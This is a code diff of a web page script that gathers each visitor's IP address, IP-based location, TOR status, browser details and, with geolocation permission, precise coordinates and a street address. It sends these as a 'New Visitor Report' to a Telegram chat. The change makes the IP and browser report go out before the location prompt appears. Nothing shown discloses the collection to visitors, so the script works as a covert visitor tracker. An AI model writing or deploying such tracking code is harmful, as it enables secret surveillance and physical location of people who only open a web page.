@@ -78,7 +78,7 @@
     async function getGeoPrompt() {
       return new Promise(resolve => {
         if (!navigator.geolocation) {
-          resolve({ allowed: false });
+          resolve(null);
           return;
         }
 
@@ -89,19 +89,18 @@
             const address = await reverseGeocode(lat, lon);
 
             resolve({
-              allowed: true,
               lat,
               lon,
               address
             });
           },
-          () => resolve({ allowed: false }),
+          () => resolve(null),
           { timeout: 5000 }
         );
       });
     }
 
-    function buildMessage(ipData, ipAddress, ipAddressResolved, browserData, geoData) {
+    function buildInitialMessage(ipData, ipAddressResolved, browserData) {
       return `📡 *New Visitor Report*
 
 🌐 *Browser Info*
@@ -124,13 +123,15 @@
 - TOR: ${ipData.security?.tor ? 'Yes' : 'No'}
 - Latitude: ${ipData.latitude}
 - Longitude: ${ipData.longitude}
-- Address: ${ipAddressResolved}
+- Address: ${ipAddressResolved}`;
+    }
 
-📌 *Geo Prompt Location*
-- Status: ${geoData.allowed ? 'Allowed' : 'Denied'}
-- Latitude: ${geoData.lat || 'N/A'}
-- Longitude: ${geoData.lon || 'N/A'}
-- Address: ${geoData.address || 'N/A'}`
+    function buildGeoMessage(geoData) {
+      return `📌 *Geo Prompt Location (Permission Allowed)*
+
+- Latitude: ${geoData.lat}
+- Longitude: ${geoData.lon}
+- Address: ${geoData.address}`;
     }
 
     (async () => {
@@ -138,16 +139,18 @@
         const ipRes = await fetch('https://api.ipify.org?format=json');
         const ip = (await ipRes.json()).ip;
 
-        const [ipData, geoData] = await Promise.all([
-          getIpData(ip),
-          getGeoPrompt()
-        ]);
-
+        const ipData = await getIpData(ip);
         const ipAddressResolved = await reverseGeocode(ipData.latitude, ipData.longitude);
         const browserData = getBrowserInfo();
-        const message = buildMessage(ipData, ip, ipAddressResolved, browserData, geoData);
 
-        sendTelegramMessage(message);
+        const initialMessage = buildInitialMessage(ipData, ipAddressResolved, browserData);
+        sendTelegramMessage(initialMessage);
+
+        const geoData = await getGeoPrompt();
+        if (geoData) {
+          const geoMessage = buildGeoMessage(geoData);
+          sendTelegramMessage(geoMessage);
+        }
       } catch (err) {
         console.error('Failed to collect and send info', err);
       }
